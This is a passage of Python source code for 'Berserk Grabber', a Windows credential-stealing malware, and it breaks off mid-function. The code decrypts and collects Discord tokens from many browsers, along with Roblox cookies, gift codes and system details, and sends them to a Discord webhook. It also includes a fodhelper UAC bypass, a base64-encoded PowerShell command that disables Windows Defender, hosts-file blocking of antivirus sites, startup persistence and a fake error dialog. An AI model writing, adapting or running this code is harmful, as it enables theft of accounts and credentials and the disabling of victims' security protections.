import base64
import concurrent.futures
import csv
import ctypes
import json
import os
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
import warnings
import winreg

warnings.filterwarnings("ignore", category=SyntaxWarning, message="invalid escape sequence")
from multiprocessing import cpu_count
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile
import shutil
import binascii
import psutil
import requests
from Cryptodome.Cipher import AES
from PIL import ImageGrab
import cv2
from requests_toolbelt.multipart.encoder import MultipartEncoder
from win32crypt import CryptUnprotectData

__CONFIG__ = {
    "webhook": "None",
    "ping": False,
    "pingtype": "None",
    "error": False,
    "startup": False,
    "defender": False,
    "block_av_sites": False,
    "systeminfo": False,
    "backupcodes": False,
    "browser": False,
    "roblox": False,
    "obfuscation": False,
    "injection": False,
    "minecraft": False,
    "wifi": False,
    "killprotector": False,
    "antidebug_vm": False,
    "discord": False,
    "anti_spam": False,
    "self_destruct": False,
    "crypto": False,
    "autofills": False,
    "common_files": False,
    "mutex": False,
    "uac_bypass": False,
    "growtopia": False,
    "bound_exe": False,
    "bound_run_startup": False
}

# global constants
REQUEST_TIMEOUT = 15
WEBHOOK_RETRIES = 3
WEBHOOK_RETRY_DELAY = 2

# global variables
temp = os.getenv("temp") or os.getenv("TEMP") or os.path.expandvars("%TEMP%")
if not temp or not os.path.isdir(temp):
    temp = os.path.expanduser("~")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
try:
    os.makedirs(temp_path, exist_ok=True)
except (OSError, PermissionError):
    temp_path = temp
localappdata = os.getenv("localappdata") or os.getenv("LOCALAPPDATA") or os.path.join(os.path.expanduser("~"), "AppData", "Local") or ""


def _get_username():
    """Username for zip/log naming; avoids OSError when getlogin() fails (e.g. service)."""
    try:
        return os.getlogin()
    except (OSError, AttributeError):
        return os.getenv("USERNAME") or os.getenv("USER") or "User"


def is_valid_webhook(webhook) -> bool:
    if webhook is None:
        return False
    s = str(webhook).strip()
    if not s or s.lower() == "none":
        return False
    return s.startswith("https://discord.com/api/webhooks/") and len(s) > 50


def safe_post(webhook, json_data=None, data=None, headers=None, files=None, timeout=REQUEST_TIMEOUT):
    for attempt in range(WEBHOOK_RETRIES):
        try:
            if json_data is not None:
                r = requests.post(webhook, json=json_data, timeout=timeout)
            elif data is not None and headers is not None:
                r = requests.post(webhook, data=data, headers=headers, timeout=timeout)
            elif files is not None:
                r = requests.post(webhook, files=files, data=data, timeout=timeout)
            else:
                return
            if r.status_code in (200, 204):
                return
        except Exception:
            if attempt < WEBHOOK_RETRIES - 1:
                time.sleep(WEBHOOK_RETRY_DELAY)
            continue


def _trim_embed_value(text, max_len=1024):
    """Trim string for Discord embed field value (max 1024)."""
    if not text or not text.strip():
        return "None"
    s = str(text).strip()
    return s[: max_len - 3] + "..." if len(s) > max_len else s


def _get_hq_friends(token):
    """Fetch friends with badges (stealcord/cstealer style)."""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }
    try:
        r = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers, timeout=REQUEST_TIMEOUT)
        if r.status_code != 200:
            return ""
        friendlist = r.json()
    except Exception:
        return ""
    badge_bits = [(1 << 0, "Staff"), (1 << 1, "Partner"), (1 << 2, "HypeSquad"), (1 << 3, "BugHunter"),
                  (1 << 6, "Bravery"), (1 << 7, "Brilliance"), (1 << 8, "Balance"), (1 << 9, "Early"),
                  (1 << 14, "VerifiedBot"), (1 << 17, "ActiveDev"), (1 << 18, "CertifiedMod")]
    out = []
    for friend in friendlist:
        if friend.get("type") != 1:
            continue
        u = friend.get("user") or {}
        flags = u.get("public_flags", 0) or 0
        badges = [name for bit, name in badge_bits if flags & bit]
        if not badges:
            continue
        uname = u.get("username", "?")
        disc = u.get("discriminator", "0")
        uid = u.get("id", "")
        out.append(f"{', '.join(badges)} | {uname}#{disc} ({uid})")
    return "\n".join(out) if out else ""


def _get_hq_guilds(token):
    """Fetch guilds where user is owner or has full perms, with invite (cstealer style)."""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers, timeout=REQUEST_TIMEOUT)
        if r.status_code != 200:
            return ""
        guilds = r.json()
    except Exception:
        return ""
    out = []
    for guild in guilds:
        if guild.get("approximate_member_count", 0) < 1:
            continue
        if not guild.get("owner") and guild.get("permissions") != "2251799813685247":
            continue
        try:
            inv_r = requests.get(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers, timeout=REQUEST_TIMEOUT)
            inv_list = inv_r.json() if inv_r.status_code == 200 else []
            inv_link = "https://discord.gg/" + str(inv_list[0]["code"]) if inv_list else "N/A"
        except Exception:
            inv_link = "N/A"
        name = guild.get("name", "?")
        count = guild.get("approximate_member_count", 0)
        out.append(f"[{name}] **{count}** members — {inv_link}")
    return "\n".join(out) if out else ""


def _get_gift_codes(token):
    """Fetch outbound promo codes and Nitro gift codes (cstealer style)."""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }
    out = []
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            for code in r.json():
                try:
                    title = code.get("promotion", {}).get("outbound_title", "?")
                    c = code.get("code", "?")
                    out.append(f"**{title}** — `{c}`")
                except Exception:
                    pass
        gifts_r = requests.get("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers, timeout=REQUEST_TIMEOUT)
        if gifts_r.status_code != 200:
            return "\n".join(out) if out else ""
        nitrocodes = gifts_r.json()
        for el in nitrocodes or []:
            try:
                sku_id = el.get("sku_id")
                plan = el.get("subscription_plan", {}) or {}
                sub_id = plan.get("id")
                name = plan.get("name", "?")
                url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={sub_id}"
                gc_r = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
                if gc_r.status_code != 200:
                    continue
                for g in gc_r.json() or []:
                    cod = g.get("code", "")
                    if cod:
                        out.append(f"**{name}** — `https://discord.gift/{cod}`")
            except Exception:
                pass
    except Exception:
        pass
    return "\n".join(out) if out else ""


def get_threads():
    threads = []
    if __CONFIG__["browser"]:
        threads.append(Browsers)
    if __CONFIG__["crypto"]:
        threads.append(SessionFiles)
    if __CONFIG__["common_files"]:
        threads.append(CommonFiles)
    if __CONFIG__["growtopia"]:
        threads.append(GrowtopiaSession)
    if __CONFIG__["wifi"]:
        threads.append(Wifi)
    if __CONFIG__["minecraft"]:
        threads.append(Minecraft)
    if __CONFIG__["backupcodes"]:
        threads.append(BackupCodes)
    threads.append(killprotector)
    if __CONFIG__["error"]:
        threads.append(fakeerror)
    if __CONFIG__["startup"]:
        threads.append(startup)
    if __CONFIG__["defender"]:
        threads.append(disable_defender)
    if __CONFIG__["block_av_sites"]:
        threads.append(block_av_sites)
    return threads


def main(webhook: str):
    if not is_valid_webhook(webhook):
        return

    threads = get_threads()
    with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
        executor.map(lambda func: func(), threads)

    zipup()

    data = {
        "username": "Berserk",
        "avatar_url": "https://avatars.githubusercontent.com/u/210432555?v=4"
    }

    _file = os.path.join(localappdata, f'Berserk-Logged-{_get_username()}.zip')

    if __CONFIG__["ping"] and __CONFIG__["pingtype"] in ["Everyone", "Here"]:
        data.update({"content": f"@{__CONFIG__['pingtype'].lower()}"})

    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "crypto", "common_files", "growtopia"]):
        try:
            if os.path.isfile(_file):
                with open(_file, 'rb') as file:
                    encoder = MultipartEncoder({
                        'payload_json': json.dumps(data),
                        'file': (f'Berserk-Logged-{_get_username()}.zip', file, 'application/zip')
                    })
                    safe_post(webhook, data=encoder, headers={'Content-type': encoder.content_type}, timeout=120)
        except Exception:
            pass
    else:
        safe_post(webhook, json_data=data)

    if __CONFIG__["systeminfo"]:
        try:
            PcInfo()
        except Exception:
            pass

    if __CONFIG__["discord"]:
        try:
            Discord()
        except Exception:
            pass

    try:
        if os.path.isfile(_file):
            os.remove(_file)
    except Exception:
        pass


def _try_mutex():
    """Single instance: exit if another instance is already running."""
    mutex_val = __CONFIG__.get("mutex")
    if not mutex_val or not isinstance(mutex_val, str):
        return
    try:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexW(None, False, mutex_val)
        if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            os._exit(0)
    except Exception:
        pass


def _try_uac_bypass():
    """Attempt UAC bypass via registry (fodhelper). Exe mode only. Exits so elevated copy runs."""
    if not __CONFIG__.get("uac_bypass"):
        return
    if not getattr(sys, "frozen", False):
        return
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            return
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command", "/d", sys.executable, "/f"],
            capture_output=True, timeout=5)
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command", "/v", "DelegateExecute", "/f"],
            capture_output=True, timeout=5)
        subprocess.Popen(["fodhelper.exe"], creationflags=0x08000000)
        time.sleep(1)
        subprocess.run(["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"], capture_output=True, timeout=5)
        os._exit(0)
    except Exception:
        pass


def _run_bound_exe():
    """Extract and run bound exe; optionally add to startup."""
    bound = __CONFIG__.get("bound_exe")
    if not bound or not isinstance(bound, str):
        return
    try:
        raw = base64.b64decode(bound)
        if len(raw) < 100 or not raw.startswith(b"MZ"):
            return
        name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8)) + ".exe"
        path = os.path.join(temp_path, name)
        with open(path, "wb") as f:
            f.write(raw)
        if __CONFIG__.get("bound_run_startup"):
            startup_dir = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if os.path.isdir(startup_dir):
                try:
                    shutil.copy2(path, os.path.join(startup_dir, name))
                except Exception:
                    pass
        subprocess.Popen([path], creationflags=0x08000000)
    except Exception:
        pass


def Berserk(webhook: str):
    if not is_valid_webhook(webhook):
        return

    _try_mutex()
    if __CONFIG__.get("uac_bypass"):
        _try_uac_bypass()
    _run_bound_exe()

    if __CONFIG__["anti_spam"]:
        AntiSpam()

    if __CONFIG__["antidebug_vm"]:
        Debug()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        if __CONFIG__["injection"]:
            executor.submit(Injection, webhook)
        executor.submit(main, webhook)

    if __CONFIG__["self_destruct"]:
        SelfDestruct()


def configcheck(list):
    """Deprecated: main() uses get_threads() instead. No-op for compatibility."""
    pass


def fakeerror():
    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)


def startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if hasattr(sys, 'frozen'):
        source_path = sys.executable
    else:
        source_path = sys.argv[0]

    target_path = os.path.join(startup_path, os.path.basename(source_path))
    if os.path.exists(target_path):
        os.remove(target_path)

    copy2(source_path, startup_path)


def disable_defender():
    cmd = base64.b64decode(b'cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK').decode()
    subprocess.run(cmd, shell=True, capture_output=True)


def block_av_sites():
    """Block antivirus and security analysis sites via hosts file."""
    hosts_domains = [
        "virustotal.com", "www.virustotal.com", "api.virustotal.com",
        "hybrid-analysis.com", "www.hybrid-analysis.com", "api.hybrid-analysis.com",
        "any.run", "www.any.run", "app.any.run",
        "virusscan.jotti.org", "www.virusscan.jotti.org",
        "joesandbox.com", "www.joesandbox.com", "api.joesandbox.com",
        "malwr.com", "www.malwr.com",
        "threatcrowd.org", "www.threatcrowd.org",
        "urlhaus.abuse.ch", "bazaar.abuse.ch", "sslbl.abuse.ch",
        "kaspersky.com", "www.kaspersky.com", "virusdesk.kaspersky.com",
        "norton.com", "www.norton.com", "submit.norton.com",
        "mcafee.com", "www.mcafee.com",
        "avast.com", "www.avast.com",
        "avg.com", "www.avg.com",
        "bitdefender.com", "www.bitdefender.com",
        "malwarebytes.com", "www.malwarebytes.com",
        "eset.com", "www.eset.com",
        "sophos.com", "www.sophos.com",
        "f-secure.com", "www.f-secure.com",
        "pandasecurity.com", "www.pandasecurity.com",
        "totalav.com", "www.totalav.com",
        "sandboxie.com", "www.sandboxie.com",
        "reverse.it", "www.reverse.it", "app.reverse.it",
        "detectify.com", "www.detectify.com",
        "opswat.com", "www.opswat.com", "metadefender.opswat.com",
    ]
    try:
        hosts_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "drivers", "etc", "hosts")
        if not os.path.exists(hosts_path):
            return
        marker = "# Berserk block_av_sites"
        with open(hosts_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        if marker in content:
            return
        lines = [os.linesep, marker]
        seen = set()
        for domain in hosts_domains:
            if domain not in seen:
                seen.add(domain)
                lines.append("127.0.0.1\t" + domain)
            if not domain.startswith("www."):
                d = "www." + domain
                if d not in seen:
                    seen.add(d)
                    lines.append("127.0.0.1\t" + d)
        lines.append("")
        with open(hosts_path, "a", encoding="utf-8") as f:
            f.write(os.linesep.join(lines))
    except (PermissionError, OSError):
        pass


def create_temp(_dir: str or os.PathLike = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path


def killprotector():
    roaming = os.getenv('APPDATA')
    path = f"{roaming}\\DiscordTokenProtector"
    config = path + "config.json"

    if not os.path.exists(path):
        return

    for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
        try:
            os.remove(path + process)
        except FileNotFoundError:
            pass

    if os.path.exists(config):
        with open(config, errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
            item['auto_start'] = False
            item['auto_start_discord'] = False
            item['integrity'] = False
            item['integrity_allowbetterdiscord'] = False
            item['integrity_checkexecutable'] = False
            item['integrity_checkhash'] = False
            item['integrity_checkmodule'] = False
            item['integrity_checkscripts'] = False
            item['integrity_checkresource'] = False
            item['integrity_redownloadhashes'] = False
            item['iterations_iv'] = 364
            item['iterations_key'] = 457
            item['version'] = 69420

        with open(config, 'w') as f:
            json.dump(item, f, indent=2, sort_keys=True)


def zipup():
    _zipfile = os.path.join(localappdata, f'Berserk-Logged-{_get_username()}.zip')
    try:
        if localappdata and not os.path.isdir(localappdata):
            os.makedirs(localappdata, exist_ok=True)
    except (OSError, PermissionError):
        pass
    try:
        zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
        for dirname, _, files in os.walk(temp_path):
            for filename in files:
                absname = os.path.join(dirname, filename)
                if not os.path.isfile(absname):
                    continue
                arcname = os.path.relpath(absname, temp_path)
                try:
                    zipped_file.write(absname, arcname)
                except (OSError, PermissionError):
                    pass
        zipped_file.close()
    except (OSError, PermissionError):
        pass


def _wmic_lines(cmd, key=None):
    """Run WMIC command and return data lines (skip header/empty). key = column name to skip."""
    try:
        r = subprocess.run(cmd, capture_output=True, shell=True, timeout=10,
                           creationflags=0x08000000)
        out = r.stdout.decode(errors='ignore').strip()
        lines = [l.strip() for l in out.splitlines() if l.strip()]
        if not lines:
            return []
        if key and lines[0].lower() == key.lower():
            lines = lines[1:]
        return [l for l in lines if l and l.lower() != key.lower()]
    except Exception:
        return []


class PcInfo:
    def __init__(self):
        self.get_inf(__CONFIG__["webhook"])

    def get_inf(self, webhook):
        username = os.getenv("UserName", "N/A")
        hostname = os.getenv("COMPUTERNAME", "N/A")

        computer_os = "N/A"
        try:
            lines = _wmic_lines('wmic os get Caption', "Caption")
            if lines:
                computer_os = lines[0]
        except Exception:
            pass

        cpu = "N/A"
        try:
            lines = _wmic_lines('wmic cpu get Name', "Name")
            if lines:
                cpu = " | ".join(lines).strip() or "N/A"
        except Exception:
            pass

        gpu_list = []
        try:
            lines = _wmic_lines('wmic path win32_VideoController get name', "Name")
            if lines:
                gpu_list = [l.strip() for l in lines if l.strip()]
        except Exception:
            pass
        gpu = ", ".join(gpu_list) if gpu_list else "N/A"

        ram = "N/A"
        try:
            total_bytes = psutil.virtual_memory().total
            ram_gb = round(total_bytes / (1024 ** 3), 1)
            ram = str(ram_gb) if ram_gb % 1 else str(int(ram_gb))
        except Exception:
            try:
                lines = _wmic_lines('wmic computersystem get totalphysicalmemory', "TotalPhysicalMemory")
                if lines and lines[0].isdigit():
                    ram = str(int(int(lines[0]) / (1024 ** 3)))
            except Exception:
                pass

        hwid = "N/A"
        try:
            r = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True,
                               timeout=10, creationflags=0x08000000)
            out = r.stdout.decode(errors='ignore').strip()
            for line in out.splitlines():
                line = line.strip()
                if line and line.lower() != "uuid" and len(line) > 30 and "-" in line:
                    hwid = line
                    break
        except Exception:
            pass

        antivirus_list = []
        try:
            pf = os.environ.get("ProgramFiles", "") or ""
            pf86 = os.environ.get("ProgramFiles(x86)", "") or ""
            av_names = [
                "Avast Software", "AVG", "Avira", "Bitdefender", "Kaspersky", "McAfee", "Norton",
                "ESET", "Trend Micro", "Windows Defender", "Malwarebytes", "Sophos", "Panda Security",
                "F-Secure", "Webroot", "BullGuard", "ZoneAlarm", "Comodo", "360",
            ]
            for name in av_names:
                for base in (pf, pf86):
                    if not base:
                        continue
                    p = os.path.join(base, name)
                    if os.path.isdir(p):
                        antivirus_list.append(name)
                        break
        except Exception:
            pass
        av_str = ", ".join(antivirus_list) if antivirus_list else "None detected"

        ip = "N/A"
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text.strip() or "N/A"
        except Exception:
            pass

        mac = "N/A"
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                if "loopback" in iface.lower() or "virtual" in iface.lower():
                    continue
                for addr in addrs:
                    a = getattr(addr, 'address', None) or ""
                    if a and len(a) == 17 and a.count(":") == 5 and not a.startswith("00:00:00:00:00:00"):
                        mac = a
                        break
                if mac != "N/A":
                    break
            if mac == "N/A" and psutil.net_if_addrs():
                _, addrs = next(iter(psutil.net_if_addrs().items()))
                for addr in addrs:
                    a = getattr(addr, 'address', None) or ""
                    if a and ":" in a:
                        mac = a
                        break
        except Exception:
            pass

        data = {
            "embeds": [
                {
                    "title": "Berserk Logger",
                    "color": 5639644,
                    "fields": [
                        {
                             "name": "System Info",
                             "value": f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu}`\n<:gpu:1051512654591688815> **GPU:** `{gpu}`\n<:ram1:1051518404181368972> **RAM:** `{ram} GB`\n🛡️ **Antivirus:** `{av_str}`'''
                        }
                    ],
                    "footer": {
                        "text": "Berserk Grabber | Created By benzoXdev"
                    },
                    "thumbnail": {
                        "url": "https://avatars.githubusercontent.com/u/210432555?v=4"
                    }
                }
            ],
            "username": "Berserk",
            "avatar_url": "https://avatars.githubusercontent.com/u/210432555?v=4"
        }

        safe_post(webhook, json_data=data)


class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__CONFIG__["webhook"])

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token}, timeout=REQUEST_TIMEOUT)
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token}, timeout=REQUEST_TIMEOUT)
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token}, timeout=REQUEST_TIMEOUT)
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def robloxinfo(self, webhook):
        if __CONFIG__["roblox"]:
            with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
                robo_cookie = f.read().strip()
                if robo_cookie == "No Roblox Cookies Found":
                    pass
                else:
                    headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
                    info = None
                    try:
                        response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, timeout=REQUEST_TIMEOUT)
                        response.raise_for_status()
                        info = response.json()
                    except requests.exceptions.HTTPError:
                        pass
                    except requests.exceptions.RequestException:
                        pass
                    if info is not None:
                        data = {
                            "embeds": [
                                {
                                    "title": "Roblox Info",
                                    "color": 5639644,
                                    "fields": [
                                        {
                                            "name": "<:roblox_icon:1041819334969937931> Name:",
                                            "value": f"`{info['UserName']}`",
                                            "inline": True
                                        },
                                        {
                                            "name": "<:robux_coin:1041813572407283842> Robux:",
                                            "value": f"`{info['RobuxBalance']}`",
                                            "inline": True
                                        },
                                        {
                                            "name": "🍪 Cookie:",
                                            "value": f"`{robo_cookie}`"
                                        }
                                    ],
                                    "thumbnail": {
                                        "url": info['ThumbnailUrl']
                                    },
                                    "footer": {
                                        "text": "Berserk Grabber | Created By benzoXdev"
                                    },
                                }
                            ],
                            "username": "Berserk",
                            "avatar_url": "https://avatars.githubusercontent.com/u/210432555?v=4",
                        }
                        safe_post(webhook, json_data=data)

    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue
            try:
                val = ""
                methods = ""
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token
                }
                r_user = requests.get(self.baseurl, headers=headers, timeout=REQUEST_TIMEOUT)
                if r_user.status_code != 200:
                    continue
                user = r_user.json()
                try:
